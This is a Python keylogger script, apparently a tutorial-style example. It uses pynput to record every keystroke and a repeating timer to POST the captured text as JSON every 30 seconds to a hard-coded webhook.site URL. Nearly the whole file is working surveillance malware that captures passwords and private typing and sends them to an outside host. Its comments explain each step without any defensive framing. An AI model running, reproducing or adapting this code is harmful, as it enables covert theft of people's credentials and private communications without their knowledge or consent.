# Install pynput using the following command: pip install pynput
# Import the mouse and keyboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

url = 'https://webhook.site/8d6e4cf6-811c-4793-bc36-cc9ffb35459e'
time_interval = 30


def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will
        # look for JSON using the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData": text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the
        # Express server code. Because we're sending JSON to the server, we specify that the MIME Type for JSON is
        # application/json.
        requests.post(url, data=payload, headers={"Content-Type": "application/json"})
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive
        # function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    finally:
        print()


# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press we handle the way the key gets logged to the in memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in
        # memory.
        text += str(key).strip("'")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
